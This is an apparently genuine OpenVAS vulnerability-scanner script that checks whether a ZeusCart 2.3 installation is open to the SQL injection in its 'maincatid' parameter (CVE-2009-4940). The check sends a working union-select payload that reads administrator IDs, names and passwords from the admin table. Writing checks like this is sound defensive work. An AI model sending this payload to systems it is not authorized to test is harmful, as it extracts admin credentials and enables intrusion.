CPE = "cpe:/a:zeuscart:zeuscart";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801240" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2010-08-02 12:38:17 +0200 (Mon, 02 Aug 2010)" );
	script_cve_id( "CVE-2009-4940" );
	script_bugtraq_id( 35151 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "ZeusCart 'maincatid' Parameter SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_zeuscart_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "zeuscart/installed" );
	script_xref( name: "URL", value: "http://inj3ct0r.com/exploits/5275" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/8829" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause SQL Injection
  attack and gain sensitive information." );
	script_tag( name: "affected", value: "ZeusCart Version 2.3" );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input
  via the 'maincatid' parameter in a 'showmaincatlanding' action which allows
  attacker to manipulate SQL queries by injecting arbitrary SQL code." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running ZeusCart and is prone to SQL injection
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/?do=featured&action=showmaincatlanding&maincatid=-9999+union" + "+all+select+concat(0x4f70656e564153,0x3a,admin_id,0x3a,admin_name," + "0x3a,admin_password,0x3a,0x4f70656e564153)+from+admin_table--";
if(http_vuln_check( port: port, url: url, pattern: ">OpenVAS:(.+):(.+):(.+):OpenVAS<" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

